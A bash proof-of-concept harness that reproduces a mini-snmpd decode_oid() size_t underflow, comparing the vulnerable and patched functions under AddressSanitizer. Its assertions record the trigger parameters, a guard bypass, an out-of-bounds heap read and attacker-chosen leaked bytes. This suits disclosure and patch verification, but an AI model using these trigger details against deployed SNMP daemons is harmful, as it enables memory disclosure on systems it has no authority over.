#!/bin/bash
# CVE-2026-59961 / GHSA-c9g2-5ghh-8g8c — mini-snmpd decode_oid() size_t
# underflow. Direct-call ASan + adjacent-heap harness. Every run re-extracts
# the verbatim pinned function and asserts SHA-256. No daemon, no listener,
# no network, no off-loopback probe.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E" vuln fixed
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      vuln/*.inc fixed/*.inc p-vuln p-fixed a-vuln-gcc a-vuln-clang a-fixed-gcc
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
    if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
    if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}
srcsha() { sha256sum "$1" | cut -d' ' -f1; }

# --- pinned bytes -----------------------------------------------------------
[ "$(srcsha ../src/protocol.c.b5322437)" = \
  4bd06467a3ac5b1b731567dba0145380acbe0106836fbdbe591be38175b10e42 ] \
  && ok "pin-vuln-protocol-sha256" || no "pin-vuln-protocol-sha256"
[ "$(srcsha ../src/protocol.c.5419bc38)" = \
  eeb05d95f46430d6e199956666b9281540c378076f85430e56bcb7f74a424cb2 ] \
  && ok "pin-fixed-protocol-sha256" || no "pin-fixed-protocol-sha256"
[ "$(srcsha ../src/fix-5419bc38.patch)" = \
  fac30b06080c4fef9a3e0b0d9d7fa6c8325d26e4578803e0d4b0994d0e447967 ] \
  && ok "pin-fix-patch-sha256" || no "pin-fix-patch-sha256"
[ "$(srcsha ../src/mini-snmpd.h.b5322437)" = \
  476c9795bb3c6942adf78b048cdad47301da562af9ffdb067adabaedf107c380 ] \
  && ok "pin-header-sha256" || no "pin-header-sha256"
[ "$(srcsha driver.c)" = \
  a7102aaa22fb6579e9271091faa1d5dfdfbca002c5c04c3f277b4e8b479f4abb ] \
  && ok "driver-sha256" || no "driver-sha256"

# --- verbatim slices: re-extracted from pinned source on every run ----------
{ echo '#line 190 "protocol.c.b5322437"'
  sed -n '190,256p' ../src/protocol.c.b5322437; } > vuln/decode_oid.inc
{ echo '#line 175 "protocol.c.b5322437"'
  sed -n '175,187p' ../src/protocol.c.b5322437; } > vuln/decode_str.inc
{ echo '#line 190 "protocol.c.5419bc38"'
  sed -n '190,256p' ../src/protocol.c.5419bc38; } > fixed/decode_oid.inc
{ echo '#line 175 "protocol.c.5419bc38"'
  sed -n '175,187p' ../src/protocol.c.5419bc38; } > fixed/decode_str.inc

[ "$(srcsha vuln/decode_oid.inc)" = \
  4c2653abe839cd278d160420d8f9e5ac80e88d019ef30106d2af65d4ce16c80b ] \
  && ok "verbatim-vuln-decode-oid-sha256" || no "verbatim-vuln-decode-oid-sha256"
[ "$(srcsha vuln/decode_str.inc)" = \
  bce2dad117a1f135ebaa5a120d13457e5ac9b755912f67e7ac7489d8c1a2b6a9 ] \
  && ok "verbatim-vuln-decode-str-sha256" || no "verbatim-vuln-decode-str-sha256"
[ "$(srcsha fixed/decode_oid.inc)" = \
  42bf0b13894fac14aacdbc0038fc036b8b14b85fb146f6790328e52f96bdfa51 ] \
  && ok "verbatim-fixed-decode-oid-sha256" || no "verbatim-fixed-decode-oid-sha256"
[ "$(srcsha fixed/decode_str.inc)" = \
  8baf0b2effe4f143019161b11b65663c34a7e3abb47dde975b897293ba9dab86 ] \
  && ok "verbatim-fixed-decode-str-sha256" || no "verbatim-fixed-decode-str-sha256"
[ "$(grep -cF 'if (*pos >= (size - len + 1)) {' vuln/decode_oid.inc)" = 1 ] \
  && ok "vuln-guard-weak" || no "vuln-guard-weak"
[ "$(grep -cF 'if (len > size || *pos >= (size - len + 1)) {' fixed/decode_oid.inc)" = 1 ] \
  && ok "fixed-guard-strong" || no "fixed-guard-strong"
[ "$(grep -cF '+	if (len > size || *pos >= (size - len + 1)) {' ../src/fix-5419bc38.patch)" = 3 ] \
  && ok "patch-tightens-three-helpers" || no "patch-tightens-three-helpers"

# --- build ------------------------------------------------------------------
cc -O0 -g -std=gnu11 -o p-vuln driver.c 2> "$E/build-p-vuln.log" \
  && ok "build-plain-vuln" || no "build-plain-vuln"
cc -O0 -g -std=gnu11 -DFIXED_VARIANT -o p-fixed driver.c 2> "$E/build-p-fixed.log" \
  && ok "build-plain-fixed" || no "build-plain-fixed"
cc -O0 -g -std=gnu11 -fsanitize=address -o a-vuln-gcc driver.c \
  2> "$E/build-a-vuln-gcc.log" && ok "build-asan-gcc-vuln" || no "build-asan-gcc-vuln"
if command -v clang >/dev/null 2>&1; then
    clang -O0 -g -std=gnu11 -fsanitize=address -o a-vuln-clang driver.c \
      2> "$E/build-a-vuln-clang.log" && ok "build-asan-clang-vuln" || no "build-asan-clang-vuln"
else
    printf 'PASS build-asan-clang-vuln (clang absent, SKIPPED)\n'
    PASS=$((PASS + 1))
fi
cc -O0 -g -std=gnu11 -DFIXED_VARIANT -fsanitize=address -o a-fixed-gcc driver.c \
  2> "$E/build-a-fixed-gcc.log" && ok "build-asan-gcc-fixed" || no "build-asan-gcc-fixed"

# --- rung 1: advisory arithmetic, no function call --------------------------
./p-vuln arith 2048 4000 8 > "$E/arith-vuln.out" 2>&1
has "$E/arith-vuln.out" 'SIZE_MINUS_LEN_PLUS_1=18446744073709549665' 'r1-size-t-underflow'
has "$E/arith-vuln.out" 'GUARD_BOUND_GT_SIZE=1' 'r1-guard-bound-wraps-past-size'
has "$E/arith-vuln.out" 'GUARD_BYPASSED=1' 'r1-weak-guard-bypassed'
has "$E/arith-vuln.out" 'READ_END_OFFSET=4007' 'r1-attacker-chosen-read-end'
has "$E/arith-vuln.out" 'OOB_BYTES=1960' 'r1-oob-extent'

# --- rung 2 + rung 4: chosen adjacent bytes land in chosen OID subid -------
./p-vuln plain 2048 4000 8 5a > "$E/plain-vuln-5a.out" 2>&1
has "$E/plain-vuln-5a.out" 'OID_SUBID_COUNT=18' 'r2-oid-subids-filled'
has "$E/plain-vuln-5a.out" 'POS_AFTER=4007' 'r2-decoder-walked-past-2048'
has "$E/plain-vuln-5a.out" 'SUBID2_HEX=0000005a' 'r4-chosen-5a-from-past-packet'
./p-vuln plain 2048 4000 8 3c > "$E/plain-vuln-3c.out" 2>&1
has "$E/plain-vuln-3c.out" 'SUBID2_HEX=0000003c' 'r4-chosen-3c-from-past-packet'
hasnt "$E/plain-vuln-3c.out" 'SUBID2_HEX=0000005a' 'r4-no-stale-5a'

# --- rung 3: ASan READ-1 at the 2048-byte redzone ---------------------------
./a-vuln-gcc asan 2048 4000 8 5a > "$E/vuln-gcc-asan.out" 2>&1
has "$E/vuln-gcc-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-gcc-asan-overflow'
has "$E/vuln-gcc-asan.out" 'READ of size 1' 'r3-gcc-asan-read1'
has "$E/vuln-gcc-asan.out" '0 bytes after 2048-byte region' 'r3-gcc-asan-at-packet-end'
has "$E/vuln-gcc-asan.out" 'in decode_oid' 'r3-gcc-asan-vulnerable-frame'
if [ -x a-vuln-clang ]; then
    ./a-vuln-clang asan 2048 4000 8 5a > "$E/vuln-clang-asan.out" 2>&1
    has "$E/vuln-clang-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-clang-asan-overflow'
    has "$E/vuln-clang-asan.out" 'READ of size 1' 'r3-clang-asan-read1'
    has "$E/vuln-clang-asan.out" '0 bytes after 2048-byte region' 'r3-clang-asan-at-packet-end'
fi

# --- fixed control: guard rejects before any read ---------------------------
./p-fixed plain 2048 4000 8 5a > "$E/fixed-plain.out" 2>&1
has "$E/fixed-plain.out" 'RC=-1' 'fixed-rejects-oversized-len'
has "$E/fixed-plain.out" 'OID_SUBID_COUNT=0' 'fixed-no-subids'
has "$E/fixed-plain.out" 'POS_AFTER=8' 'fixed-pos-unchanged'
hasnt "$E/fixed-plain.out" 'SUBID2_HEX=' 'fixed-no-oob-byte-in-result'
./a-fixed-gcc asan 2048 4000 8 5a > "$E/fixed-gcc-asan.out" 2>&1
hasnt "$E/fixed-gcc-asan.out" 'ERROR: AddressSanitizer' 'fixed-asan-clean'
has "$E/fixed-gcc-asan.out" 'RC=-1' 'fixed-asan-rejects'

# --- safe control: in-bounds BER length stays clean -------------------------
./p-vuln safe 2048 16 8 5a > "$E/vuln-safe.out" 2>&1
has "$E/vuln-safe.out" 'RC=0' 'safe-vuln-decodes-cleanly'
has "$E/vuln-safe.out" 'POS_AFTER=24' 'safe-pos-stays-in-bounds'
./a-vuln-gcc asan 2048 16 8 5a > "$E/vuln-gcc-asan-safe.out" 2>&1
hasnt "$E/vuln-gcc-asan-safe.out" 'ERROR: AddressSanitizer' 'safe-asan-clean'

# --- deterministic normalized trace: no PID, address, path or frame number --
{
    cat "$E/arith-vuln.out" "$E/plain-vuln-5a.out" "$E/plain-vuln-3c.out" \
        "$E/fixed-plain.out" "$E/vuln-safe.out"
    grep -E 'ERROR: AddressSanitizer|READ of size|bytes after|in decode_oid|^RC=' \
        "$E/vuln-gcc-asan.out" "$E/fixed-gcc-asan.out" "$E/vuln-gcc-asan-safe.out"
} | sed -E 's#/[^ ]*/lab/frontier#lab/frontier#g; s/0x[0-9a-f]+/0xADDR/g; s/#[0-9]+ /#FRAME /g; s/==[0-9]+==/==PID==/g; s#in decode_oid [^ ]+#in decode_oid SOURCE#g; s#SUMMARY: AddressSanitizer: heap-buffer-overflow [^ ]+#SUMMARY: AddressSanitizer: heap-buffer-overflow SOURCE#g' > "$E/normalized.txt"
TRACE=$(srcsha "$E/normalized.txt")
printf 'TRACE_SHA256=%s\n' "$TRACE"

printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
